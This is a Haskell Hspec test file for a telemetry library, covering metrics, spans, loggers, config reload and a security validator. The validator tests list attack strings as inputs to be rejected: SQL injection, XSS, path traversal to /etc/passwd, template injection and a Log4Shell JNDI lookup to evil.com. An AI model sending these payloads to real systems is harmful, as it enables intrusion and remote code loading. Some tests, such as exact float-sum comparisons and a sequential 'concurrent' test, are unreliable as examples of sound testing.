{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE BlockArguments #-}

module AdvancedCabalTestSpec2 (spec) where

import Test.Hspec
import Test.QuickCheck
import Control.Exception (try, SomeException, evaluate)
import Control.Monad (replicateM, when, zipWithM_)
import qualified Data.Text as Text
import Data.Text (pack, unpack)
import Data.IORef
import System.IO.Unsafe (unsafePerformIO)
import Data.Char (isControl, isAscii)
import Data.List (sort, nub)
import Azimuth.Telemetry

-- | Test metric aggregation with QuickCheck properties
spec :: Spec
spec = do
  describe "AdvancedCabalTestSpec2 - Enhanced Telemetry Tests" $ do
    
    -- 1. Metric Aggregation QuickCheck Tests
    describe "Metric Aggregation QuickCheck Properties" $ do
      it "should aggregate metric values correctly" $ property $
        \(values :: [Double]) ->
          let metric = unsafePerformIO $ createMetricWithInitialValue "aggregation-test" "count" 0.0
              _ = unsafePerformIO $ mapM (recordMetric metric) values
              finalValue = unsafePerformIO $ metricValue metric
              expectedValue = sum values
          in finalValue `shouldBe` expectedValue
      
      it "should handle empty metric name and unit in aggregation" $ property $
        \(values :: [Double]) ->
          let metric = unsafePerformIO $ createMetricWithInitialValue "" "" 0.0
              _ = unsafePerformIO $ mapM (recordMetric metric) values
              finalValue = unsafePerformIO $ metricValue metric
              expectedValue = sum values
          in finalValue `shouldBe` expectedValue
      
      it "should handle special characters in metric names during aggregation" $ property $
        \(values :: [Double]) (name :: String) (unit :: String) ->
          let specialName = pack $ name ++ "!@#$%^&*()_+-=[]{}|;':\",./<>?"
              specialUnit = pack $ unit ++ "特殊字符🚀"
              metric = unsafePerformIO $ createMetricWithInitialValue specialName specialUnit 0.0
              _ = unsafePerformIO $ mapM (recordMetric metric) values
              finalValue = unsafePerformIO $ metricValue metric
              expectedValue = sum values
          in finalValue `shouldBe` expectedValue

    -- 2. Cross-module Telemetry Data Consistency Tests
    describe "Cross-module Telemetry Data Consistency" $ do
      it "should maintain metric consistency across multiple creations" $ do
        -- Enable metric sharing for this test
        writeIORef enableMetricSharing True
        writeIORef enableMetricAggregation True
        
        -- Create first metric
        metric1 <- createMetric "consistency-test" "count"
        recordMetric metric1 10.0
        value1 <- metricValue metric1
        
        -- Create second metric with same name and unit
        metric2 <- createMetric "consistency-test" "count"
        value2 <- metricValue metric2
        
        -- Values should be the same due to sharing
        value1 `shouldBe` 10.0
        value2 `shouldBe` 10.0
        
        -- Record through second metric
        recordMetric metric2 20.0
        value1' <- metricValue metric1
        value2' <- metricValue metric2
        
        -- Both should have the aggregated value
        value1' `shouldBe` 30.0
        value2' `shouldBe` 30.0
      
      it "should handle span trace context consistency" $ do
        -- Create first span
        span1 <- createSpan "consistency-span-1"
        traceId1 <- return $ spanTraceId span1
        
        -- Create second span (should share trace context)
        span2 <- createSpan "consistency-span-2"
        traceId2 <- return $ spanTraceId span2
        
        -- Both spans should have the same trace ID
        traceId1 `shouldBe` traceId2
        traceId1 `shouldNotBe` pack ""
        traceId2 `shouldNotBe` pack ""
      
      it "should maintain logger properties across operations" $ do
        logger <- createLogger "consistency-logger" Info
        
        -- Verify initial properties
        loggerName logger `shouldBe` pack "consistency-logger"
        loggerLevel logger `shouldBe` Info
        
        -- Perform logging operations
        logMessage logger Debug (pack "debug message")
        logMessage logger Info (pack "info message")
        logMessage logger Warn (pack "warning message")
        logMessage logger Error (pack "error message")
        
        -- Properties should remain unchanged
        loggerName logger `shouldBe` pack "consistency-logger"
        loggerLevel logger `shouldBe` Info

    -- 3. Configuration Hot Reload Tests
    describe "Configuration Hot Reload" $ do
      it "should handle configuration changes without losing data" $ do
        -- Initialize with first config
        let config1 = TelemetryConfig "hot-reload-test" "1.0.0" True True True False
        initTelemetry config1
        
        -- Create and record metric
        metric <- createMetric "hot-reload-metric" "count"
        recordMetric metric 15.0
        valueBefore <- metricValue metric
        valueBefore `shouldBe` 15.0
        
        -- Update configuration
        let config2 = TelemetryConfig "hot-reload-test-updated" "2.0.0" False True False True
        initTelemetry config2
        
        -- Metric should retain its value
        valueAfter <- metricValue metric
        valueAfter `shouldBe` 15.0
        
        -- Continue recording
        recordMetric metric 25.0
        finalValue <- metricValue metric
        finalValue `shouldBe` 40.0
        
        shutdownTelemetry
      
      it "should handle multiple rapid configuration changes" $ do
        let configs = 
              [ TelemetryConfig "rapid-config-1" "1.0.0" True True True False
              , TelemetryConfig "rapid-config-2" "1.1.0" False True True False
              , TelemetryConfig "rapid-config-3" "1.2.0" True False True False
              , TelemetryConfig "rapid-config-4" "1.3.0" True True False False
              , TelemetryConfig "rapid-config-5" "1.4.0" False False False False
              ]
        
        -- Apply configurations rapidly
        sequence_ $ map initTelemetry configs
        
        -- Create metric and verify it works
        metric <- createMetric "rapid-config-metric" "count"
        recordMetric metric 100.0
        value <- metricValue metric
        value `shouldBe` 100.0
        
        shutdownTelemetry

    -- 4. Resource Limit Boundary Condition Tests
    describe "Resource Limit Boundary Conditions" $ do
      it "should handle extremely large metric names" $ do
        let veryLongName = pack $ replicate 50000 'a'
            veryLongUnit = pack $ replicate 10000 'b'
        
        metric <- createMetric veryLongName veryLongUnit
        metricName metric `shouldBe` veryLongName
        metricUnit metric `shouldBe` veryLongUnit
        
        -- Should still be able to record values
        recordMetric metric 42.0
        value <- metricValue metric
        value `shouldBe` 42.0
      
      it "should handle extremely long span names" $ do
        let veryLongName = pack $ replicate 100000 'c'
        
        span <- createSpan veryLongName
        spanName span `shouldBe` veryLongName
        spanTraceId span `shouldNotBe` pack ""
        spanSpanId span `shouldNotBe` pack ""
        
        -- Should still be able to finish span
        finishSpan span
      
      it "should handle extremely long logger names" $ do
        let veryLongName = pack $ replicate 75000 'd'
        
        logger <- createLogger veryLongName Error
        loggerName logger `shouldBe` veryLongName
        loggerLevel logger `shouldBe` Error
        
        -- Should still be able to log messages
        logMessage logger Info (pack "test message with very long logger name")
      
      it "should handle resource exhaustion gracefully" $ do
        -- Create many metrics to test resource limits
        let numMetrics = 10000
        metrics <- sequence $ replicate numMetrics $ do
          createMetric "resource-limit-test" "count"
        
        length metrics `shouldBe` numMetrics
        
        -- Record values on all metrics
        sequence_ $ zipWith (\metric index -> recordMetric metric (fromIntegral index)) metrics [1..]
        
        -- Verify all metrics have correct values
        values <- sequence $ map metricValue metrics
        values `shouldBe` map fromIntegral [1..numMetrics]

    -- 5. Security Validator Tests
    describe "Security Validator Functionality" $ do
      it "should detect malicious patterns in input" $ do
        validator <- createSecurityValidator
        
        let maliciousInputs = 
              [ "'; DROP TABLE users"
              , "<script>alert('xss')</script>"
              , "javascript:void(0)"
              , "../../etc/passwd"
              , "{{7*7}}"
              , "${jndi:ldap://evil.com/a}"
              , pack "\x00\x01\x02"
              ]
        
        -- All malicious inputs should be rejected
        results <- sequence $ map (validateInput validator) maliciousInputs
        all (== False) results `shouldBe` True
      
      it "should sanitize input by removing control characters" $ do
        validator <- createSecurityValidator
        
        let inputWithControlChars = pack "text\x00with\x01control\x02chars"
            expectedSanitized = pack "textwithcontrolchars"
        
        sanitized <- sanitizeInput validator inputWithControlChars
        sanitized `shouldBe` expectedSanitized
      
      it "should truncate overly long input" $ do
        validator <- createSecurityValidator
        
        let veryLongInput = pack $ replicate 20000 'x'
            expectedLength = 10000
        
        sanitized <- sanitizeInput validator veryLongInput
        Text.length sanitized `shouldBe` expectedLength
        Text.take 5 sanitized `shouldBe` pack "xxxxx"
        Text.takeEnd 5 sanitized `shouldBe` pack "xxxxx"
      
      it "should handle unicode and special characters correctly" $ do
        validator <- createSecurityValidator
        
        let unicodeInputs = 
              [ pack "测试中文"
              , pack "🚀 emoji test 🌟"
              , pack "αβγδε greek letters"
              , pack "ñáéíóú accented letters"
              ]
        
        -- All unicode inputs should be valid
        results <- sequence $ map (validateInput validator) unicodeInputs
        all (== True) results `shouldBe` True
        
        -- Sanitization should preserve unicode
        sanitized <- sequence $ map (sanitizeInput validator) unicodeInputs
        zipWithM_ (\input sanitized -> sanitized `shouldBe` input) unicodeInputs sanitized

    -- 6. Advanced Edge Case Tests
    describe "Advanced Edge Cases" $ do
      it "should handle NaN and infinity values in metrics" $ do
        metric <- createMetric "extreme-values" "test"
        
        -- Record NaN
        recordMetric metric (0/0)
        value1 <- metricValue metric
        isNaN value1 `shouldBe` True
        
        -- Record infinity
        recordMetric metric (1/0)
        value2 <- metricValue metric
        isInfinite value2 `shouldBe` True
        
        -- Record negative infinity
        recordMetric metric (-1/0)
        value3 <- metricValue metric
        isInfinite value3 `shouldBe` True
      
      it "should handle concurrent operations with shared metrics" $ do
        -- Enable metric sharing
        writeIORef enableMetricSharing True
        writeIORef enableMetricAggregation True
        
        -- Create shared metrics
        metrics <- sequence $ replicate 10 $ createMetric "concurrent-shared" "count"
        
        -- Record values concurrently
        sequence_ $ map (`recordMetric` 1.0) metrics
        
        -- All metrics should have the same value due to sharing
        values <- sequence $ map metricValue metrics
        all (== 10.0) values `shouldBe` True
      
      it "should handle empty and whitespace-only strings" $ do
        let testStrings = 
              [ pack ""
              , pack " "
              , pack "\t"
              , pack "\n"
              , pack "\r"
              , pack "   "
              , pack "\t\n\r   "
              ]
        
        -- Test with metric names and units
        sequence_ $ flip map testStrings $ \str -> do
          metric <- createMetric str str
          metricName metric `shouldBe` str
          metricUnit metric `shouldBe` str
          recordMetric metric 42.0
          value <- metricValue metric
          value `shouldBe` 42.0
        
        -- Test with span names
        sequence_ $ flip map testStrings $ \str -> do
          span <- createSpan str
          spanName span `shouldBe` str
          finishSpan span
        
        -- Test with logger names
        sequence_ $ flip map testStrings $ \str -> do
          logger <- createLogger str Info
          loggerName logger `shouldBe` str
          logMessage logger Info str